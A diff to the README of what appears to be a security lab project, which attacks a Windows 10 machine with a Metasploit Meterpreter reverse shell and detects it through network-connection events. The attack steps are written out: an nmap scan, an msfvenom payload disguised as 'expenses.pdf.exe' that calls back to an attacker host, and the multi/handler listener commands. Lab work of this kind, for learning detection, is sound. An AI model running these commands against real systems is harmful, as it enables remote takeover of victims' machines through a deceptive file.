@@ -12,16 +12,24 @@ The objective of this project is to compromise a Windows 10 machine and detect t
 
 ## Attack Simulation
 Payload: `windows/meterpreter/reverse_tcp` \
-Tools used: `msfvenom`, `msfconsole`
+Tools used: Metasploit framework (`msfvenom`, `msfconsole`)
 
-Steps taken:
+###Steps taken:
 1. Find an open port using nmap -A -Pn <Victim IP address>
 2. Generate the payload using:
 `msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=<host IP address> lport=<host unused port>
  -f exe -o expenses.pdf.exe`
 3. Deliver the payload to the victim machine
-4. Establish a Meterpreter session using: 
-   `use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set LHOST <Attacker_IP> set LPORT <Port> run`
+4. Establish a Meterpreter session via msfconsole
+   To receive the reverse shell, Metasplit's `exploit/multi/handler` module was used to be a listener and capture a connection from the malicious payload
+   ```bash
+   msfconsole
+   use exploit/multi/handler
+   set payload windows/meterpreter/reverse_tcp
+   set lhost <attacker IP address>
+   set lport <open port used in (2)>
+   exploit
+   ```
 
 ## Detection
 Using EventCode=3 detected a unusual network connection from `<attacker IP address>` to port `<3389> (RDP)`. \
